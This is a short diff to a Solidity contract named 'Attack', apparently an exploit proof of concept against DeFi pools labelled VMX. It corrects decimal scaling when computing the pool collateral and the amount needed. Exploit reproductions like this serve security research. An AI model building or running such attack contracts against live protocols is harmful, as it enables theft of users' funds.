@@ -225,10 +225,9 @@ contract Attack {
         usdAmount = IERC20(USDC).balanceOf(VMX_USDC_POOL);
         uint wETHAmount = IERC20(WETH).balanceOf(VMX_WETH_POOL);
         uint wstETHAmount = IERC20(wstETH).balanceOf(VMX_WSTETH_POOL);
-        uint totalCol = usdAmount * usdcPrice + wETHAmount * wethPrice * 12/10+ wstETHAmount * wstethPrice * 12/10;
+        uint totalCol = usdAmount * usdcPrice/1e6 + wETHAmount * wethPrice * 12/10 / 1e18+ wstETHAmount * wstethPrice * 12/10 / 1e18;
         uint needCol = totalCol * 65 * 70/ 10000 + 1;
-        uint needAmount = needCol / price + 1;
-
+        uint needAmount = needCol / price * 1e18 + 1;
     }
 
 }
